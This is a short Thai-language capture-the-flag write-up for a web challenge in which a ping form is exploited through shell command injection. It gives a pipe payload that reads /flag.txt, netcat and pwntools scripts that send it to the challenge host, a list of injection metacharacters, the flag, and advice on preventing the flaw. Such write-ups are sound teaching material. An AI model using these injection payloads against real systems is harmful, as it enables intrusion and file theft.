# Pingpong (Web, 100pts)

**Flag:** `DELTA{p1ng_p0ng_c0mm4nd_1nj3ct10n_v1a_sh3ll}`

## โจทย์

ฟังก์ชัน ping ของเว็บรับ IP แล้วรัน `ping` command — เราต้องรันคำสั่งอื่นแทน

## ขั้นตอน

### 1. Command Injection

Backend น่าจะรัน:

```bash
ping -c 4 $user_input
```

ใช้ `|` (pipe) เพื่อรันคำสั่งต่อ:

```
127.0.0.1|cat /flag.txt
```

กลายเป็น:

```bash
ping -c 4 127.0.0.1|cat /flag.txt
```

### 2. ส่ง Payload

```bash
echo "127.0.0.1|cat /flag.txt" | nc 13.238.150.105 32570
```

## หลักการ

Shell characters ที่ใช้ inject:
- `|` — pipe command
- `;` — semicolon
- `&&` — AND
- `` ` `` — command substitution
- `$(...)` — command substitution

## Exploit

```python
from pwn import *

r = remote("13.238.150.105", 32570)
r.sendline(b"127.0.0.1|cat /flag.txt")
print(r.recvall().decode())
```

## สรุป

- อย่าส่ง user input ไปยัง shell โดยตรง
- ใช้ `subprocess.run([...])` แบบ list arguments
- ถ้าจำเป็น ใช้ `shlex.quote()`
